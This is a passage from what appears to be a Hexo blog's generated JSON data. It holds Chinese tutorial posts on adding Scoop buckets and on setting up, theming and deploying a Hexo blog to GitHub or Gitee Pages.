href=\"#添加仓库\" class=\"headerlink\" title=\"添加仓库\"></a>添加仓库</h1><p>scoop 自带的 main bucket 软件过少，我们需要添加官方维护的 extras bucket：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop bucket add extras</span><br></pre></td></tr></table></figure>\n\n<p>也可以添加其他的第三方 bucket:</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scoop bucket add bucketname bucketaddress</span><br></pre></td></tr></table></figure>\n\n<p>例如添加 scoopbucket 并安装 cajviewer：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># add scoopbucket</span></span><br><span class=\"line\">scoop bucket add scoopbucket https://github.com/yuanying1199/scoopbucket</span><br><span class=\"line\"><span class=\"comment\"># install cajviewer</span></span><br><span class=\"line\">scoop install scoopbucket/cajviewerlite</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://boyinthesun.cn/post/scoop/\">Scoop 安装详解</a></p>\n<p><a href=\"https://www.jianshu.com/p/50993df76b1c\">scoop——强大的 Windows 命令行包管理工具</a></p>"},{"title":"Hexo Blog","date":"2021-08-15T11:53:45.000Z","_content":"\n# 前言\n\n前面我用 `jkell` 弄了个 Github 博客，虽然能凑活着用，但还是对效果不是很满意。后面看到别人都在用 Hexo 的 Next 主题界面，看起来简洁又好看，于是在经过很长时间后（懒癌晚期），我终于下载了 `hexo cli`，尝试了一下，效果还成，这是写的第一篇博客，后面会将以前写的博客也更新上来。\n\n<!--more-->\n\n# hexo 下载配置\n\n官网： http://hexo.io\n\ngithub: https://github.com/hexojs/hexo\n\n1. 安装\n   ```bash\n   npm install hexo-cli -g\n   ```\n2. 在本地新建一个文件夹存放代码\n3. 初始化\n   ```bash\n   hexo init\n   ```\n4. 启动博客\n   ```bash\n   hexo s\n   # or\n   hexo server\n   ```\n5. 根据提示在浏览器输入 `http://localhost:4000` 就可以访问到本地启动的博客了。\n6. 输入`hexo help`可以查看命令选项\n7. 写文章\n   ```bash\n   hexo new 'your_article_name'\n   ```\n   运行此命令会在 `hexo_project/source/_posts` 文件夹下建立一个新 markdown 文件，当然你可以不用命令，自己手动建新 md 文件，不过要注意最前面的标题前的格式与目前主题文章保持一致\n8. 编译发布新文章\n\n   ```bash\n   # 清除以前编译的文件\n   hexo clean\n\n   # 编译文章页面\n   hexo generate\n\n   # 方便写法\n   hexo clean && hexo generate\n   ```\n\n9. 修改主题（以 Next 主题为例）\n   1. 进入 Hexo 项目文件夹\n   2. 下载主题\n      ```bash\n      git clone https://github.com/theme-next/hexo-theme-next themes/next\n      ```\n   3. 修改站点配置文件 `_config.yml` 中的 `theme: landscape` ，改为 `theme: next`\n10. 将博客发布到代码仓库，例如 GitHub\n11. 安装插件\n    ```bash\n    npm install hexo-deployer-git --save\n    ```\n12. 编辑项目的 `_config.yml` 文件，修改如下参数\n\n    ```bash\n    # Set your site url here. For example, if you use GitHub Page, set url as 'https://username.github.io/project'\n    url: https://neonatal.gitee.io/\n\n    # 发布仓库\n    deploy:\n        type: git\n        repo: ssh地址 # 仓库的ssh地址\n        branch: website # 要推送到的分支\n    ```\n\n13. 发布到代码库\n    ```bash\n    hexo d\n    # or\n    hexo delpoy\n    ```\n14. 不出意外应该可以通过 pages 访问到博客界面了\n15. 注：`GitHub`建立`Github Pages`仓库命名应为`username.github.io`，而`Gitee`建立`Gitee Pages`仓库应为`username`，这样就可以通过 https://username.github.io 或 https://username.gitee.io 访问了。\n16. 再注：也可以将整个项目放到`GitHub`上，更推荐这样做。\n\n# 添加标签、分类等页面\n\n添加页面的过程是类似的，下面以添加标签页为例：\n\n1. 新建页面，用 Hexo 新建页面命令\n   ```bash\n   hexo new page \"tages\"\n   ```\n2. 打开 `/source/tages/index.md` ，设置其类型 `type` 值为“tages”\n   ```bash\n   title: 标签\n   date: 2021-08-20 20:14:27\n   type: \"tags\"\n   ```\n3. 打开 `themes/your_theme/_config.yml` ，将对应项取消注释即可，没有的话自己添加需要的页面名称\n   ```yml\n   menu:\n     home: / || fa fa-home\n     #about: /about/ || fa fa-user\n     tags: /tags/ || fa fa-tags\n     #categories: /categories/ || fa fa-th\n     archives: /archives/ || fa fa-archive\n   ```\n\n# 插入图片\n\n1. 绝对引用\n   - 少量使用图片时可用此方法，将图片文件放入 `your_blog/public/images` 文件夹下，使用 `![picture](/public/images/picture.jpg)` 方式直接引用。\n   - 存在问题：图片管理麻烦，删除文章时图片仍在，引用关系混乱\n2. 相对引用\n   - 在 `your_blog/_config.yml` 文件中配置 `post_asset_folder: true` ，新建文章的时候建立同名文件夹，将图片放入\n   - 使用 `![picture](article/picture.jpg)` 引用图片\n   - 优点：管理比较方便\n3. CDN 或图床引用\n   - 所使用图片在网络图库上，直接使用图片链接即可，`![picture](https://website.com/picture.jpg)`\n   - 缺点：可能会失效，可自己使用图床网站上传自己的图片得到链接\n\n# 参考\n\n- [使用 Hexo+GitHub 搭建个人免费博客教程（小白向）](https://zhuanlan.zhihu.com/p/60578464#:~:text=%E4%BD%BF%E7%94%A8%20Hexo%2BGitHub%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B%EF%BC%88%E5%B0%8F%E7%99%BD%E5%90%91%EF%BC%89%201%20%E5%87%86%E5%A4%87%202%20%E8%BF%9E%E6%8E%A5%20Github....,Hexo%20%E5%88%B0%20GitHub%20Pages%206%20%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89....%207%20%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8)\n- [Hexo 新建标签、分类、归档等页面](https://blog.csdn.net/weixin_41287260/article/details/97758641)\n- [Hexo 博客插入图片的方法](https://www.cnblogs.com/hugochen1024/p/12570656.html)\n","source":"_posts/2021/08/hexo-blog.md","raw":"---\ntitle: Hexo Blog\ndate: 2021-08-15 19:53:45\ntags:\n  - 博客\ncategories:\n  - 博客\n  - Hexo\n---\n\n# 前言\n\n前面我用 `jkell` 弄了个 Github 博客，虽然能凑活着用，但还是对效果不是很满意。后面看到别人都在用 Hexo 的 Next 主题界面，看起来简洁又好看，于是在经过很长时间后（懒癌晚期），我终于下载了 `hexo cli`，尝试了一下，效果还成，这是写的第一篇博客，后面会将以前写的博客也更新上来。\n\n<!--more-->\n\n# hexo 下载配置\n\n官网： http://hexo.io\n\ngithub: https://github.com/hexojs/hexo\n\n1. 安装\n   ```bash\n   npm install hexo-cli -g\n   ```\n2. 在本地新建一个文件夹存放代码\n3. 初始化\n   ```bash\n   hexo init\n   ```\n4. 启动博客\n   ```bash\n   hexo s\n   # or\n   hexo server\n   ```\n5. 根据提示在浏览器输入 `http://localhost:4000` 就可以访问到本地启动的博客了。\n6. 输入`hexo help`可以查看命令选项\n7. 写文章\n   ```bash\n   hexo new 'your_article_name'\n   ```\n   运行此命令会在 `hexo_project/source/_posts` 文件夹下建立一个新 markdown 文件，当然你可以不用命令，自己手动建新 md 文件，不过要注意最前面的标题前的格式与目前主题文章保持一致\n8. 编译发布新文章\n\n   ```bash\n   # 清除以前编译的文件\n   hexo clean\n\n   # 编译文章页面\n   hexo generate\n\n   # 方便写法\n   hexo clean && hexo generate\n   ```\n\n9. 修改主题（以 Next 主题为例）\n   1. 进入 Hexo 项目文件夹\n   2. 下载主题\n      ```bash\n      git clone https://github.com/theme-next/hexo-theme-next themes/next\n      ```\n   3. 修改站点配置文件 `_config.yml` 中的 `theme: landscape` ，改为 `theme: next`\n10. 将博客发布到代码仓库，例如 GitHub\n11. 安装插件\n    ```bash\n    npm install hexo-deployer-git --save\n    ```\n12. 编辑项目的 `_config.yml` 文件，修改如下参数\n\n    ```bash\n    # Set your site url here. For example, if you use GitHub Page, set url as 'https://username.github.io/project'\n    url: https://neonatal.gitee.io/\n\n    # 发布仓库\n    deploy:\n        type: git\n        repo: ssh地址 # 仓库的ssh地址\n        branch: website # 要推送到的分支\n    ```\n\n13. 发布到代码库\n    ```bash\n    hexo d\n    # or\n    hexo delpoy\n    ```\n14. 不出意外应该可以通过 pages 访问到博客界面了\n15. 注：`GitHub`建立`Github Pages`仓库命名应为`username.github.io`，而`Gitee`建立`Gitee Pages`仓库应为`username`，这样就可以通过 https://username.github.io 或 https://username.gitee.io 访问了。\n16. 再注：也可以将整个项目放到`GitHub`上，更推荐这样做。\n\n# 添加标签、分类等页面\n\n添加页面的过程是类似的，下面以添加标签页为例：\n\n1. 新建页面，用 Hexo 新建页面命令\n   ```bash\n   hexo new page \"tages\"\n   ```\n2. 打开 `/source/tages/index.md` ，设置其类型 `type` 值为“tages”\n   ```bash\n   title: 标签\n   date: 2021-08-20 20:14:27\n   type: \"tags\"\n   ```\n3. 打开 `themes/your_theme/_config.yml` ，将对应项取消注释即可，没有的话自己添加需要的页面名称\n   ```yml\n   menu:\n     home: / || fa fa-home\n     #about: /about/ || fa fa-user\n     tags: /tags/ || fa fa-tags\n     #categories: /categories/ || fa fa-th\n     archives: /archives/ || fa fa-archive\n   ```\n\n# 插入图片\n\n1. 绝对引用\n   - 少量使用图片时可用此方法，将图片文件放入 `your_blog/public/images` 文件夹下，使用 `![picture](/public/images/picture.jpg)` 方式直接引用。\n   - 存在问题：图片管理麻烦，删除文章时图片仍在，引用关系混乱\n2. 相对引用\n   - 在 `your_blog/_config.yml` 文件中配置 `post_asset_folder: true` ，新建文章的时候建立同名文件夹，将图片放入\n   - 使用 `![picture](article/picture.jpg)` 引用图片\n   - 优点：管理比较方便\n3. CDN 或图床引用\n   - 所使用图片在网络图库上，直接使用图片链接即可，`![picture](https://website.com/picture.jpg)`\n   - 缺点：可能会失效，可自己使用图床网站上传自己的图片得到链接\n\n# 参考\n\n- [使用 Hexo+GitHub 搭建个人免费博客教程（小白向）](https://zhuanlan.zhihu.com/p/60578464#:~:text=%E4%BD%BF%E7%94%A8%20Hexo%2BGitHub%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B%EF%BC%88%E5%B0%8F%E7%99%BD%E5%90%91%EF%BC%89%201%20%E5%87%86%E5%A4%87%202%20%E8%BF%9E%E6%8E%A5%20Github....,Hexo%20%E5%88%B0%20GitHub%20Pages%206%20%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89....%207%20%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8)\n- [Hexo 新建标签、分类、归档等页面](https://blog.csdn.net/weixin_41287260/article/details/97758641)\n- [Hexo 博客插入图片的方法](https://www.cnblogs.com/hugochen1024/p/12570656.html)\n","slug":"2021/08/hexo-blog","published":1,"updated":"2022-07-23T14:41:42.291Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj2001dzge33b0naar9","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>前面我用 <code>jkell</code> 弄了个 Github 博客，虽然能凑活着用，但还是对效果不是很满意。后面看到别人都在用 Hexo 的 Next 主题界面，看起来简洁又好看，于是在经过很长时间后（懒癌晚期），我终于下载了 <code>hexo cli</code>，尝试了一下，效果还成，这是写的第一篇博客，后面会将以前写的博客也更新上来。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"hexo-下载配置\"><a href=\"#hexo-下载配置\" class=\"headerlink\" title=\"hexo 下载配置\"></a>hexo 下载配置</h1><p>官网： <a href=\"http://hexo.io/\">http://hexo.io</a></p>\n<p>github: <a href=\"https://github.com/hexojs/hexo\">https://github.com/hexojs/hexo</a></p>\n<ol>\n<li><p>安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g</span><br></pre></td></tr></table></figure></li>\n<li><p>在本地新建一个文件夹存放代码</p>\n</li>\n<li><p>初始化</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo init</span><br></pre></td></tr></table></figure></li>\n<li><p>启动博客</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo s</span><br><span class=\"line\"><span class=\"comment\"># or</span></span><br><span class=\"line\">hexo server</span><br></pre></td></tr></table></figure></li>\n<li><p>根据提示在浏览器输入 <code>http://localhost:4000</code> 就可以访问到本地启动的博客了。</p>\n</li>\n<li><p>输入<code>hexo help</code>可以查看命令选项</p>\n</li>\n<li><p>写文章</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new <span class=\"string\">&#x27;your_article_name&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>运行此命令会在 <code>hexo_project/source/_posts</code> 文件夹下建立一个新 markdown 文件，当然你可以不用命令，自己手动建新 md 文件，不过要注意最前面的标题前的格式与目前主题文章保持一致</p>\n</li>\n<li><p>编译发布新文章</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 清除以前编译的文件</span></span><br><span class=\"line\">hexo clean</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 编译文章页面</span></span><br><span class=\"line\">hexo generate</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方便写法</span></span><br><span class=\"line\">hexo clean &amp;&amp; hexo generate</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>修改主题（以 Next 主题为例）</p>\n<ol>\n<li>进入 Hexo 项目文件夹</li>\n<li>下载主题<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></li>\n<li>修改站点配置文件 <code>_config.yml</code> 中的 <code>theme: landscape</code> ，改为 <code>theme: next</code></li>\n</ol>\n</li>\n<li><p>将博客发布到代码仓库，例如 GitHub</p>\n</li>\n<li><p>安装插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li>\n<li><p>编辑项目的 <code>_config.yml</code> 文件，修改如下参数</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class=\"line\">url: https://neonatal.gitee.io/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 发布仓库</span></span><br><span class=\"line\">deploy:</span><br><span class=\"line\">    <span class=\"built_in\">type</span>: git</span><br><span class=\"line\">    repo: ssh地址 <span class=\"comment\"># 仓库的ssh地址</span></span><br><span class=\"line\">    branch: website <span class=\"comment\"># 要推送到的分支</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>发布到代码库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo d</span><br><span class=\"line\"><span class=\"comment\"># or</span></span><br><span class=\"line\">hexo delpoy</span><br></pre></td></tr></table></figure></li>\n<li><p>不出意外应该可以通过 pages 访问到博客界面了</p>\n</li>\n<li><p>注：<code>GitHub</code>建立<code>Github Pages</code>仓库命名应为<code>username.github.io</code>，而<code>Gitee</code>建立<code>Gitee Pages</code>仓库应为<code>username</code>，这样就可以通过 <a href=\"https://username.github.io/\">https://username.github.io</a> 或 <a href=\"https://username.gitee.io/\">https://username.gitee.io</a> 访问了。</p>\n</li>\n<li><p>再注：也可以将整个项目放到<code>GitHub</code>上，更推荐这样做。</p>\n</li>\n</ol>\n<h1 id=\"添加标签、分类等页面\"><a href=\"#添加标签、分类等页面\" class=\"headerlink\" title=\"添加标签、分类等页面\"></a>添加标签、分类等页面</h1><p>添加页面的过程是类似的，下面以添加标签页为例：</p>\n<ol>\n<li>新建页面，用 Hexo 新建页面命令<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new page <span class=\"string\">&quot;tages&quot;</span></span><br></pre></td></tr></table></figure></li>\n<li>打开 <code>/source/tages/index.md</code> ，设置其类型 <code>type</code> 值为“tages”<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">title: 标签</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2021-08-20 20:14:27</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure></li>\n<li>打开 <code>themes/your_theme/_config.yml</code> ，将对应项取消注释即可，没有的话自己添加需要的页面名称<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">menu:</span></span><br><span class=\"line\">  <span class=\"attr\">home:</span> <span class=\"string\">/</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-home</span></span><br><span class=\"line\">  <span class=\"comment\">#about: /about/ || fa fa-user</span></span><br><span class=\"line\">  <span class=\"attr\">tags:</span> <span class=\"string\">/tags/</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-tags</span></span><br><span class=\"line\">  <span class=\"comment\">#categories: /categories/ || fa fa-th</span></span><br><span class=\"line\">  <span class=\"attr\">archives:</span> <span class=\"string\">/archives/</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-archive</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"插入图片\"><a href=\"#插入图片\" class=\"headerlink\" title=\"插入图片\"></a>插入图片</h1><ol>\n<li>绝对引用<ul>\n<li>少量使用图片时可用此方法，将图片文件放入 <code>your_blog/public/images</code> 文件夹下，使用 <code>![picture](/public/images/picture.jpg)</code> 方式直接引用。</li>\n<li>存在问题：图片管理麻烦，删除文章时图片仍在，引用关系混乱</li>\n</ul>\n</li>\n<li>相对引用<ul>\n<li>在 <code>your_blog/_config.yml</code> 文件中配置 <code>post_asset_folder: true</code> ，新建文章的时候建立同名文件夹，将图片放入</li>\n<li>使用 <code>![picture](article/picture.jpg)</code> 引用图片</li>\n<li>优点：管理比较方便</li>\n</ul>\n</li>\n<li>CDN 或图床引用<ul>\n<li>所使用图片在网络图库上，直接使用图片链接即可，<code>![picture](https://website.com/picture.jpg)</code></li>\n<li>缺点：可能会失效，可自己使用图床网站上传自己的图片得到链接</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/60578464#:~:text=%E4%BD%BF%E7%94%A8%20Hexo%2BGitHub%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B%EF%BC%88%E5%B0%8F%E7%99%BD%E5%90%91%EF%BC%89%201%20%E5%87%86%E5%A4%87%202%20%E8%BF%9E%E6%8E%A5%20Github....,Hexo%20%E5%88%B0%20GitHub%20Pages%206%20%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89....%207%20%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8\">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_41287260/article/details/97758641\">Hexo 新建标签、分类、归档等页面</a></li>\n<li><a href=\"https://www.cnblogs.com/hugochen1024/p/12570656.html\">Hexo 博客插入图片的方法</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>前面我用 <code>jkell</code> 弄了个 Github 博客，虽然能凑活着用，但还是对效果不是很满意。后面看到别人都在用 Hexo 的 Next 主题界面，看起来简洁又好看，于是在经过很长时间后（懒癌晚期），我终于下载了 <code>hexo cli</code>，尝试了一下，效果还成，这是写的第一篇博客，后面会将以前写的博客也更新上来。</p>","more":"<h1 id=\"hexo-下载配置\"><a href=\"#hexo-下载配置\" class=\"headerlink\" title=\"hexo 下载配置\"></a>hexo 下载配置</h1><p>官网： <a href=\"http://hexo.io/\">http://hexo.io</a></p>\n<p>github: <a href=\"https://github.com/hexojs/hexo\">https://github.com/hexojs/hexo</a></p>\n<ol>\n<li><p>安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g</span><br></pre></td></tr></table></figure></li>\n<li><p>在本地新建一个文件夹存放代码</p>\n</li>\n<li><p>初始化</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo init</span><br></pre></td></tr></table></figure></li>\n<li><p>启动博客</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo s</span><br><span class=\"line\"><span class=\"comment\"># or</span></span><br><span class=\"line\">hexo server</span><br></pre></td></tr></table></figure></li>\n<li><p>根据提示在浏览器输入 <code>http://localhost:4000</code> 就可以访问到本地启动的博客了。</p>\n</li>\n<li><p>输入<code>hexo help</code>可以查看命令选项</p>\n</li>\n<li><p>写文章</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new <span class=\"string\">&#x27;your_article_name&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>运行此命令会在 <code>hexo_project/source/_posts</code> 文件夹下建立一个新 markdown 文件，当然你可以不用命令，自己手动建新 md 文件，不过要注意最前面的标题前的格式与目前主题文章保持一致</p>\n</li>\n<li><p>编译发布新文章</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 清除以前编译的文件</span></span><br><span class=\"line\">hexo clean</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 编译文章页面</span></span><br><span class=\"line\">hexo generate</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方便写法</span></span><br><span class=\"line\">hexo clean &amp;&amp; hexo generate</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>修改主题（以 Next 主题为例）</p>\n<ol>\n<li>进入 Hexo 项目文件夹</li>\n<li>下载主题<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></li>\n<li>修改站点配置文件 <code>_config.yml</code> 中的 <code>theme: landscape</code> ，改为 <code>theme: next</code></li>\n</ol>\n</li>\n<li><p>将博客发布到代码仓库，例如 GitHub</p>\n</li>\n<li><p>安装插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li>\n<li><p>编辑项目的 <code>_config.yml</code> 文件，修改如下参数</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class=\"line\">url: https://neonatal.gitee.io/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 发布仓库</span></span><br><span class=\"line\">deploy:</span><br><span class=\"line\">    <span class=\"built_in\">type</span>: git</span><br><span class=\"line\">    repo: ssh地址 <span class=\"comment\"># 仓库的ssh地址</span></span><br><span class=\"line\">    branch: website <span class=\"comment\"># 要推送到的分支</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>发布到代码库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo d</span><br><span class=\"line\"><span class=\"comment\"># or</span></span><br><span class=\"line\">hexo delpoy</span><br></pre></td></tr></table></figure></li>\n<li><p>不出意外应该可以通过 pages 访问到博客界面了</p>\n</li>\n<li><p>注：<code>GitHub</code>建立<code>Github Pages</code>仓库命名应为<code>username.github.io</code>，而<code>Gitee</code>建立<code>Gitee Pages</code>仓库应为<code>username</code>，这样就可以通过 <a href=\"https://username.github.io/\">https://username.github.io</a> 或 <a href=\"https://username.gitee.io/\">https://username.gitee.io</a> 访问了。</p>\n</li>\n<li><p>再注：也可以将整个项目放到<code>GitHub</code>上，更推荐这样做。</p>\n</li>\n</ol>\n<h1 id=\"添加标签、分类等页面\"><a href=\"#添加标签、分类等页面\" class=\"headerlink\" title=\"添加标签、分类等页面\"></a>添加标签、分类等页面</h1><p>添加页面的过程是类似的，下面以添加标签页为例：</p>\n<ol>\n<li>新建页面，用 Hexo 新建页面命令<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new page <span class=\"string\">&quot;tages&quot;</span></span><br></pre></td></tr></table></figure></li>\n<li>打开 <code>/source/tages/index.md</code> ，设置其类型 <code>type</code> 值为“tages”<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">title: 标签</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2021-08-20 20:14:27</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure></li>\n<li>打开 <code>themes/your_theme/_config.yml</code> ，将对应项取消注释即可，没有的话自己添加需要的页面名称<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">menu:</span></span><br><span class=\"line\">  <span class=\"attr\">home:</span> <span class=\"string\">/</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-home</span></span><br><span class=\"line\">  <span class=\"comment\">#about: /about/ || fa fa-user</span></span><br><span class=\"line\">  <span class=\"attr\">tags:</span> <span class=\"string\">/tags/</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-tags</span></span><br><span class=\"line\">  <span class=\"comment\">#categories: /categories/ || fa fa-th</span></span><br><span class=\"line\">  <span class=\"attr\">archives:</span> <span class=\"string\">/archives/</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-archive</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"插入图片\"><a href=\"#插入图片\" class=\"headerlink\" 